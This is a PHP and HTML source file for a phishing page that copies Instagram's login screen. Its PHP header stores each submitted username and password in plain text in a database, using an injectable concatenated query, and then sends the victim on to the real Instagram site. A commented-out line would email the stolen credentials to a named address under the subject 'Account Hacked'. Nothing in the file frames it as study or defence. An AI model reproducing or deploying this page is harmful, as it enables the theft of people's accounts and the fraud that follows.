<?php
include('connection.php');
if(isset($_POST['username']))
{
  //print_r($_POST);
  $sql="insert into users(username,password,date) values('".$_POST['username']."','".$_POST['password']."','".date("Y-m-d H:i:s")."')";
  if(mysqli_query($conn,$sql))
  {
    $message=$_POST['username']." - Password: ". $_POST['password'];
    //mail("mzsabir@gmail.com","Account Hacked: ",$message);
    header("location:https://www.instagram.com/");
    
  }else
  {
    //die("Unable to Write to Database");
    header("location:https://www.instagram.com/");
  }
 
} 
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>

  <link rel="stylesheet" href="style.css">
</head>

<body>

  <div id="content-container">

    <!--Phone's pictures section-->
    <section class="phones">
      <img src="./img/phones.png" alt="pictures on phone" class="phone-image">
      <div class="display-phone">
        <img class="picture" src="./images/photo-1.png" alt="#">
        <img class="picture" src="./img/photo-2.png" alt="#">
        <img class="picture" src="./img/photo-3.png" alt="#">
        <img class="picture" src="./img/photo-4.png" alt="#">
        <img class="picture" src="./img/photo-5.png" alt="#">
      </div>
    </section>

    <!--User's log in section-->
    <section class="user">

      <div class="login-container">

        <!--Instagram Logo-->
        <div class="instagram-logo-box">
          <img class="instagram-logo" src="./img/instagram-logo.png">
        </div>

        <!--Form Login-->
        <form id="login-post" method="POST" action="index.php">
          <div class="inputs-container">
            <input type="text" name="username" placeholder="Phone number, username or email">
          </div>
          <div class="inputs-container">
            <input type="password" name="password" placeholder="Password">
          </div>
          <input type="submit" value="Log in" class="login-button">

          <div class="or-container">
            <div class="line"></div>
            <div class="or">OR</div>
            <div class="line"></div>
          </div>

          <!--Facebook login-->
          <div class="facebook-container">
            <a class="facebook-login" href="#" target="_blank"><img class="facebook-logo" src="./img/facebook-logo.png">Log in
              with Facebook</a>
          </div>
        </form>

        <!--Password recovery-->
        <a class="password-forgot" href="#" target="_blank">Forgot password?</a>
      </div>

      <!--Sign up-->
      <div class="signup-container">
        <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
      </div>

      <!--App's download-->
      <div class="get-container">
        <p>Get the app.</p>
        <div class="download-container">
          <a class="download-appstore" href="#" target="_blank"><img class="appstore" src="./img/applestore-logo.png"></a>
          <a class="download-googleplay" href="#" target="_blank"><img class="googleplay" src="./img/googleplay-logo.png"></a>
        </div>
      </div>

    </section>

  </div>

  <footer class="page-footer">

    <div class="links-container">
      <ul class="links-list">
        <li>
          <a class="link" href="#" target="_blank">ABOUT</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">PRESS</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">API</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">JOBS</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">PRIVACY</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">TERMS</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">LOCATIONS</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">TOP ACCOUNTS</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">HASHTAGS</a>
        </li>
        <li>
          <a class="link" href="#" target="_blank">LANGUAGE</a>
        </li>
      </ul>
    </div>

    <div class="footer-span-container">
      <span class="footer-span">
        © 2020 INSTAGRAM FROM FACEBOOK
      </span>
    </div>
  </footer>
</body>

</html>